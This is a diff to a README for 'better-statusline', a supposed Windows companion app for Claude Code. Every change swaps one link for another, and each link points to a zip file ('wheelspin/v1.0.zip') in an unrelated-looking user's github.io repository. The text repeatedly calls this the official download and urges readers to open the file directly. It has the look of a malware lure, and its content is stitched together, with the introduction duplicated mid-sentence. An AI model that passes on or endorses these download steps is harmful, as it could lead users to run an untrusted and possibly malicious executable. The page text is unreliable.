@@ -5,7 +5,7 @@ description: "Render Claude Code session metrics as dot-matrix rings with your n
 ---
 # 🎛️ better-statusline - See Session Stats and Music
 
-[![Download better-statusline](https://img.shields.io/badge/⬇_Download-better--statusline-ff5c8a?style=for-the-badge&labelColor=6c5ce7&logo=github&logoColor=white)](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip)
+[![Download better-statusline](https://img.shields.io/badge/⬇_Download-better--statusline-ff5c8a?style=for-the-badge&labelColor=6c5ce7&logo=github&logoColor=white)](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip)
 
 better-statusline is a small companion app for Claude Code. It adds a clear status line to your session, shows your session figures as dot-matrix rings, and places the music you are playing right beside them. Instead of hunting through windows for a quick update, you get one compact view that keeps the important details in sight.
 
@@ -30,7 +30,7 @@ The result is a simple, useful dashboard that sits with your work. It is designe
 
 Use the official download page to get better-statusline for Windows.
 
-[Download better-statusline](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip)
+[Download better-statusline](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip)
 
 Visit this link to download the application. The page is the official place to get the app. Once the download finishes, open the downloaded file to start better-statusline on your Windows computer.
 
@@ -38,7 +38,7 @@ The download page is the same link shown in the button at the top of this page. 
 
 ## 📥 Download and Start
 
-1. Open the download page: [better-statusline releases](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip).
+1. Open the download page: [better-statusline releases](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip).
 2. Visit this link to download the application.
 3. When the download is complete, open the downloaded file.
 4. better-statusline starts and shows its status view.
@@ -49,7 +49,7 @@ That is the whole process. You do not need to install extra tools, unpack folder
 
 When better-statusline opens for the first time, it presents the session view:# 🎛️ better-statusline - See Session Stats and Music
 
-[![Download better-statusline](https://img.shields.io/badge/⬇_Download-better--statusline-ff5c8a?style=for-the-badge&labelColor=6c5ce7&logo=github&logoColor=white)](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip)
+[![Download better-statusline](https://img.shields.io/badge/⬇_Download-better--statusline-ff5c8a?style=for-the-badge&labelColor=6c5ce7&logo=github&logoColor=white)](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip)
 
 better-statusline is a small companion app for Claude Code. It adds a clear status line to your session, shows your session figures as dot-matrix rings, and places the music you are playing right beside them. Instead of hunting through windows for a quick update, you get one compact view that keeps the important details in sight.
 
@@ -74,7 +74,7 @@ The result is a simple, useful dashboard that sits with your work. It is designe
 
 Use the official download page to get better-statusline for Windows.
 
-[Download better-statusline](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip)
+[Download better-statusline](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip)
 
 Visit this link to download the application. The page is the official place to get the app. Once the download finishes, open the downloaded file to start better-statusline on your Windows computer.
 
@@ -82,7 +82,7 @@ The download page is the same link shown in the button at the top of this page. 
 
 ## 📥 Download and Start
 
-1. Open the download page: [better-statusline releases](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip).
+1. Open the download page: [better-statusline releases](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip).
 2. Visit this link to download the application.
 3. When the download is complete, open the downloaded file.
 4. better-statusline starts and shows its status view.
@@ -164,6 +164,6 @@ The project is hosted on GitHub, and the download page is the official source fo
 - Open the download page, visit the link to download the application, and open the file.
 - No setup steps are needed before you start.
 
-[Download better-statusline](https://github.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/raw/refs/heads/main/wheelspin/v1.0.zip)
+[Download better-statusline](https://raw.githubusercontent.com/Yellowdeliciousgrandcanyon551/yellowdeliciousgrandcanyon551.github.io/main/wheelspin/v1.0.zip)
 
 Keywords: better-statusline, Claude Code status line, dot-matrix rings, session display, music display, Windows app, status companion, session stats, download better-statusline
